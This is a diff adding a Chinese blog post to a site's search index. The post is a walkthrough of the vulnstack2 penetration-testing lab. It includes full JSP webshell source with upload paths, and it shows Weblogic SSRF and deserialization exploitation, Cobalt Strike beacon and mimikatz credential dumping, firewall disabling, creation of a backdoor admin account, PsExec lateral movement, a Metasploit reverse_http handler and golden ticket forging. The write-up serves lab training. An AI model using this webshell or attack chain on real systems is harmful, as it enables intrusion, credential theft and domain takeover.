@@ -5209,4 +5209,130 @@ $R=$Z('',$X);$R();
         <tag>面试</tag>
       </tags>
   </entry>
+  <entry>
+    <title>vulnstack2靶场</title>
+    <url>/posts/8a9ea0cb/</url>
+    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>统一登录密码 <code>1qaz@WSX</code></p>
+<p>Web密码错误的，在快照管理器里面选择转到1.3即可,默认为空，然后修改密码为统一密码</p>
+<p>然后再web主机上开启Weblogic服务</p>
+<p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h4><p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
+<p><code>sudo nmap 192.168.0.80 -sV</code></p>
+<blockquote>
+<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
+</blockquote>
+<p><img src="/posts/8a9ea0cb/nmap.png"></p>
+<p>先从7001的weblogic下手，使用WeblogicScan扫描一下是否存在漏洞</p>
+<p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
+<p>得到后台路径为<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
+<p>检测到存在<code>CVE20192725</code> 和 ssrf漏洞</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用ssrf漏洞进行端口探测"><a href="#利用ssrf漏洞进行端口探测" class="headerlink" title="利用ssrf漏洞进行端口探测"></a>利用ssrf漏洞进行端口探测</h4><p>存在位置<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
+<p>抓包测试</p>
+<p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
+<p>此处的operator为可控点，输入一个存在的端口<code>127.0.0.1:7001</code> 会返回一个状态码</p>
+<p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
+<p>输入一个不存在的端口时<code>192.168.0.80:1234</code> 会返回<code>but could not connect over HTTP to server</code></p>
+<p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
+<p>输入<code>127.0.0.1:6379</code> 返回<code>but could not connect over HTTP to server</code>说明没有开放6379端口，没法继续利用去弹redis shell</p>
+<p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrf利用</a></p>
+<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>直接使用6哥师傅的java反序列化终极测试工具.</p>
+<p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
+<p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
+<p><a href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogic上传木马时路径选择</a></p>
+<p>1.把shell写到控制台images目录中</p>
+<p><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
+<p>访问<code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
+<p>2.写到uddiexplorer目录中</p>
+<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp</code></p>
+<p>访问<code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code></p>
+<p>3.写到应用安装目录中</p>
+<p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</code></p>
+<p>访问<code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>
+<p>上传蚁剑的jsp马。密码为ant</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls &#x3D; request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls !&#x3D; null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
+<p>使用蚁剑进行连接</p>
+<p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
+<p>然后可以使用<code>As-Exploits</code>插件</p>
+<p>发现该机器上有安装360</p>
+<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
+<p><img src="/posts/8a9ea0cb/cs1.png"></p>
+<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前用户sid  shell whoami &#x2F;user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user &#x2F;domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view &#x2F;domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; &#x2F;domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; &#x2F;domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>shell whoami /user</code></p>
+<p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
+<p><code>shell systeminfo</code></p>
+<p><img src="/posts/8a9ea0cb/cs_systeminfo.png"></p>
+<p><code>shell net config workstation</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_config_workstation.png"></p>
+<p><code>shell net user /domain</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_user_domain.png"></p>
+<p><code>net computers</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_computers.png"></p>
+<p>使用CS的portscan模块扫描域内主机端口</p>
+<p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
+<p>关闭防火墙<code>netsh advfirewall set allprofiles state off</code></p>
+<p><code>shell net view </code> 发现报错6118，在网上查了下是因为没有开启<code>Computer Brower</code>服务，去看了下，web服务器把该服务禁止了，开启后就可以正常使用了（因为刚才是的时候web服务器密码登录不上去，然后切换了快照，手动开启了web服务）</p>
+<p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
+<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
+<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
+<p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
+<p>使用CS的<code>run_mimikatz</code>模块</p>
+<p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
+<p>得到凭据信息，密码为<code>1qaz@WSX</code></p>
+<p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
+<h4 id="创建用户登录3389"><a href="#创建用户登录3389" class="headerlink" title="创建用户登录3389"></a>创建用户登录3389</h4><p>查看3389是否开放</p>
+<p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
+<p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
+<p>添加用户到管理员权限 <code>shell net localgroup administrators Mamor /add</code></p>
+<p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
+<p><code>sudo rdesktop 192.168.0.80:3389 </code> 使用 <code>Mamor</code> <code>1qaz@WSX</code>成功登录</p>
+<p><img src="/posts/8a9ea0cb/rdesktop.png"></p>
+<p>(注：这里的360防护好像没有起作用，没有进行拦截)</p>
+<h4 id="使用PSexec横向移动"><a href="#使用PSexec横向移动" class="headerlink" title="使用PSexec横向移动"></a>使用PSexec横向移动</h4><p>使用和上一个靶场一样的方法，创建一个smb监听器</p>
+<p>在Targets中 选择主机右键jump-&gt; psexec，选择票据</p>
+<p>然后得到如图，可以通过这种方法得到web机器的system权限</p>
+<p><img src="/posts/8a9ea0cb/cs_graph_view.png"></p>
+<p>成功拿到域控DC.</p>
+<h4 id="CS派生MSF"><a href="#CS派生MSF" class="headerlink" title="CS派生MSF"></a>CS派生MSF</h4><p>在CS中创建一个 Foreign HTTP listener</p>
+<p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
+<p>在msf中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt;  set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
+<p>msf添加路由</p>
+<p><img src="/posts/8a9ea0cb/msf_autoroute.png"></p>
+<p><img src="/posts/8a9ea0cb/route_print.png"></p>
+<p>配置代理，在proxychains4设置127.0.0.1 1080</p>
+<p><img src="/posts/8a9ea0cb/socks_proxy.png"></p>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><h5 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h5><p>在域控获取krbtgt账户的NTLM hash值和SID</p>
+<p><img src="/posts/8a9ea0cb/dc_hashdump.png"></p>
+<p><code>82dfc71b72a11ef37d663047bc2088fb</code></p>
+<p><img src="/posts/8a9ea0cb/dc_logonpasswords.png"></p>
+<p>SID <code>S-1-5-21-2756371121-2868759905-3853650604</code></p>
+<h5 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h5><p>黄金票据时伪造票据授予票据(TGT)</p>
+<p>利用需要的条件:</p>
+<p>1.域名称</p>
+<p>2.域的SID值</p>
+<p>3.域的KRBTGT账户NTLM密码哈希</p>
+<p>4.伪造用户名</p>
+<p>使用CS清除client端(域内其他机器)的票据</p>
+<p><code>kerberos_ticket_purge</code></p>
+<p><code>shell klist</code>查看票据信息是否已经被清除</p>
+<p><img src="/posts/8a9ea0cb/cs_shell_kilist.png"></p>
+<p>使用CS生成黄金票据</p>
+<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket.png"></p>
+<p><img src="/posts/8a9ea0cb/cs_Golden_Ticket2.png"></p>
+]]></content>
+      <categories>
+        <category>vulnstack</category>
+      </categories>
+      <tags>
+        <tag>vulnstack</tag>
+      </tags>
+  </entry>
 </search>
